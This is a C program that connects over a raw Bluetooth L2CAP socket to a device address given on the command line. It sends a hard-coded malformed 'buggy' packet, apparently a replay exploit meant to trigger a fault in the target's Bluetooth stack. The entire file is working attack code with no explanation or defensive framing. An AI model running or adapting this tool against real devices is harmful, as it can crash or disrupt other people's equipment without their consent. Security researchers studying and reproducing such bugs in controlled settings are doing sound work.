#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

char replay_buggy_packet[] = "\xB1\x01\xDB\x69\x94\x5C\x07\x4E\x0D\x9B\x2E\xF1";

int main(int argc, char **argv)
{
    struct sockaddr_l2 addr;
    int sock, sent, i;
    int size = sizeof(replay_buggy_packet); // Dynamically determine the size

    if(argc < 2)
    {
        fprintf(stderr, "%s <btaddr>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;

    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    str2ba(argv[1], &addr.l2_bdaddr);
    
    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }
    
    if ((sent = send(sock, replay_buggy_packet, size, 0)) >= 0) // Use dynamic size instead of SIZE
    {
        printf("L2CAP packet sent (%d)\n", sent);
    }

    printf("Buffer:\t");
    for(i = 0; i < sent; i++)
        printf("%.2X ", (unsigned char) replay_buggy_packet[i]);
    printf("\n");

    close(sock);
    return EXIT_SUCCESS;
}
